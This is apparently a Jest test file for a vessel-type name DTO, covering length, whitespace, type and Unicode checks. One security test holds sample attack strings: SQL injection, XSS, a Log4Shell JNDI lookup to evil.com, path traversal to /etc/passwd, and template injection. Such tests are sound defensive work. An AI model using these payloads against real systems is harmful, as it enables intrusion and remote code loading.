import { validate } from 'class-validator';
import { plainToInstance } from 'class-transformer';
import { VesselTypeInputDto } from './vessel-type-input.dto';

describe('VesselTypeInputDto Validation', () => {
  async function validateDto(data: any): Promise<string[]> {
    const dto = plainToInstance(VesselTypeInputDto, data);
    const errors = await validate(dto);
    return errors.flatMap(error => Object.values(error.constraints || {}));
  }

  describe('Valid inputs', () => {
    it('should pass validation for valid vessel type names', async () => {
      const validNames = [
        'Cargo',
        'Fishing Vessel',
        'A', // Single character
        'A'.repeat(30), // Max length (30 characters)
        'Type-1',
        'Type_1',
        'Type (Commercial)',
        'Fishing & Cargo',
        'Oil/Gas Tanker',
        'Yacht-Luxury',
        'Ferry@Port',
        'Vessel#123',
        'Type$Special',
        'Vessel%Test',
        'Type^Power',
        'Vessel*Star',
        'Type+Plus',
        'Vessel=Equal',
        'Type|Pipe',
        'Vessel\\Back',
        'Type`Tick',
        'Vessel~Tilde',
        'Type[Bracket]',
        'Vessel{Brace}',
        'Type<Less>',
        'Åland Ferry', // Nordic characters
        'Niño Vessel', // Spanish characters
        'François Ship', // French characters
        'Müller Boat', // German characters
        '货船', // Chinese characters
        'рыболовное судно', // Cyrillic (lowercase)
        'РЫБОЛОВНОЕ СУДНО', // Cyrillic (uppercase)
        'πλοίο', // Greek characters
        '🚢 Ship', // Emoji
        'Type\u00A0Non-breaking', // Non-breaking space
      ];

      for (const name of validNames) {
        const errors = await validateDto({ name });
        expect(errors).toHaveLength(0);
      }
    });

    it('should trim whitespace and pass validation', async () => {
      const inputsWithWhitespace = [
        '  Cargo  ',
        '\tFishing Vessel\t',
        '\nTanker\n',
        '\r\nContainer\r\n',
        '   Multi   Space   ',
      ];

      for (const name of inputsWithWhitespace) {
        const dto = plainToInstance(VesselTypeInputDto, { name });
        const errors = await validate(dto);
        
        expect(errors).toHaveLength(0);
        expect(dto.name.trim()).toBe(dto.name); // Should be trimmed
        expect(dto.name.length).toBeGreaterThan(0);
      }
    });
  });

  describe('Invalid inputs - Empty and whitespace', () => {
    it('should fail validation for empty string', async () => {
      const errors = await validateDto({ name: '' });
      
      expect(errors).toContain('Vessel type name cannot be empty');
    });

    it('should fail validation for whitespace-only strings', async () => {
      const whitespaceInputs = [
        ' ',
        '  ',
        '\t',
        '\n',
        '\r',
        '\r\n',
        '\t\n\r ',
        '\u00A0', // Non-breaking space
        '\u2000', // En quad
        '\u2001', // Em quad
        '\u2002', // En space
        '\u2003', // Em space
        '\u2004', // Three-per-em space
        '\u2005', // Four-per-em space
        '\u2006', // Six-per-em space
        '\u2007', // Figure space
        '\u2008', // Punctuation space
        '\u2009', // Thin space
        '\u200A', // Hair space
      ];

      for (const name of whitespaceInputs) {
        const errors = await validateDto({ name });
        expect(errors).toContain('Vessel type name cannot be empty');
      }
    });

    it('should fail validation for null and undefined', async () => {
      const nullErrors = await validateDto({ name: null });
      expect(nullErrors).toContain('Vessel type name cannot be empty');

      const undefinedErrors = await validateDto({ name: undefined });
      expect(undefinedErrors).toContain('Vessel type name cannot be empty');

      const missingErrors = await validateDto({});
      expect(missingErrors).toContain('Vessel type name cannot be empty');
    });
  });

  describe('Invalid inputs - Length constraints', () => {
    it('should fail validation for names exceeding 30 characters', async () => {
      const longNames = [
        'A'.repeat(31), // 31 characters
        'A'.repeat(50), // 50 characters
        'A'.repeat(100), // 100 characters
        'Very Long Vessel Type Name That Exceeds Limit', // Natural long name
        'Κάποιο πολύ μακρύ όνομα τύπου σκάφους', // Greek long name
        'Очень длинное название типа судна которое превышает лимит', // Cyrillic long name
      ];

      for (const name of longNames) {
        const errors = await validateDto({ name });
        expect(errors).toContain('Vessel type name cannot exceed 30 characters');
      }
    });

    it('should pass validation for exactly 30 characters', async () => {
      const exactLength = 'A'.repeat(30);
      const errors = await validateDto({ name: exactLength });
      
      expect(errors).toHaveLength(0);
    });
  });

  describe('Invalid inputs - Type constraints', () => {
    it('should fail validation for non-string types', async () => {
      const nonStringInputs = [
        123,
        true,
        false,
        [],
        {},
        { name: 'nested' },
        Date.now(),
        new Date(),
        /regex/,
        Symbol('test'),
      ];

      for (const name of nonStringInputs) {
        const errors = await validateDto({ name });
        expect(errors.some(error => 
          error.includes('must be a string') || 
          error.includes('Vessel type name cannot be empty')
        )).toBe(true);
      }
    });

    it('should handle number-like strings correctly', async () => {
      const numberStrings = ['123', '0', '3.14', '-1', '1e10', 'NaN', 'Infinity'];
      
      for (const name of numberStrings) {
        const errors = await validateDto({ name });
        expect(errors).toHaveLength(0); // These should be valid as strings
      }
    });
  });

  describe('Edge cases and security', () => {
    it('should handle potential injection attempts', async () => {
      const injectionAttempts = [
        'DROP TABLE vessels;',
        "'; DROP TABLE vessels; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com/a}',
        '../../../etc/passwd',
        '{{7*7}}',
        '#{7*7}',
        '<%= 7*7 %>',
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const name of injectionAttempts) {
        if (name.length <= 30) {
          const errors = await validateDto({ name });
          expect(errors).toHaveLength(0); // Should pass validation but be handled safely
        }
      }
    });

    it('should handle Unicode edge cases', async () => {
      const unicodeEdgeCases = [
        '\u0000', // Null character
        '\uFFFF', // Replacement character
        '\u200B', // Zero-width space
        '\u200C', // Zero-width non-joiner
        '\u200D', // Zero-width joiner
        '\uFEFF', // Byte order mark
        '🚢🚢🚢🚢🚢🚢🚢🚢🚢🚢🚢🚢🚢🚢', // Multiple emoji (may exceed length)
        'A\uD800\uDC00B', // Surrogate pair
        'Test\u001FControl', // Control character
      ];

      for (const name of unicodeEdgeCases) {
        const errors = await validateDto({ name });
        // Some might fail due to length or empty after trimming
        const isValid = errors.length === 0;
        const hasLengthError = errors.some(e => e.includes('exceed 30 characters'));
        const hasEmptyError = errors.some(e => e.includes('cannot be empty'));
        
        expect(isValid || hasLengthError || hasEmptyError).toBe(true);
      }
    });

    it('should handle very large strings gracefully', async () => {
      const veryLargeString = 'A'.repeat(10000);
      const errors = await validateDto({ name: veryLargeString });
      
      expect(errors).toContain('Vessel type name cannot exceed 30 characters');
    });
  });

  describe('Transformation behavior', () => {
    it('should trim whitespace during transformation', async () => {
      const testCases = [
        { input: '  Cargo  ', expected: 'Cargo' },
        { input: '\tFishing\t', expected: 'Fishing' },
        { input: '\nTanker\n', expected: 'Tanker' },
        { input: '  Multi  Space  ', expected: 'Multi  Space' }, // Internal spaces preserved
      ];

      for (const { input, expected } of testCases) {
        const dto = plainToInstance(VesselTypeInputDto, { name: input });
        expect(dto.name).toBe(expected);
      }
    });

    it('should handle null transformation gracefully', async () => {
      const dto = plainToInstance(VesselTypeInputDto, { name: null });
      expect(dto.name).toBeNull();
    });

    it('should handle undefined transformation gracefully', async () => {
      const dto = plainToInstance(VesselTypeInputDto, { name: undefined });
      expect(dto.name).toBeUndefined();
    });
  });

  describe('Multiple validation errors', () => {
    it('should return multiple errors when applicable', async () => {
      // This would be hard to trigger with current validators, but let's test empty case
      const errors = await validateDto({ name: '' });
      
      // Should have at least the empty validation error
      expect(errors.length).toBeGreaterThan(0);
      expect(errors).toContain('Vessel type name cannot be empty');
    });

    it('should prioritize empty validation over length validation', async () => {
      const errors = await validateDto({ name: '' });
      
      // Should get empty error, not length error
      expect(errors).toContain('Vessel type name cannot be empty');
      expect(errors).not.toContain('Vessel type name cannot exceed 30 characters');
    });
  });

  describe('Class transformer integration', () => {
    it('should work with plainToInstance correctly', async () => {
      const plainObject = { name: '  Test Vessel  ' };
      const dto = plainToInstance(VesselTypeInputDto, plainObject);
      
      expect(dto).toBeInstanceOf(VesselTypeInputDto);
      expect(dto.name).toBe('Test Vessel'); // Trimmed
    });

    it('should handle arrays of objects', async () => {
      const plainArray = [
        { name: 'Cargo' },
        { name: '  Fishing  ' },
        { name: 'Tanker' }
      ];
      
      const dtos = plainToInstance(VesselTypeInputDto, plainArray);
      
      expect(dtos).toHaveLength(3);
      expect(dtos[0].name).toBe('Cargo');
      expect(dtos[1].name).toBe('Fishing'); // Trimmed
      expect(dtos[2].name).toBe('Tanker');
    });
  });
});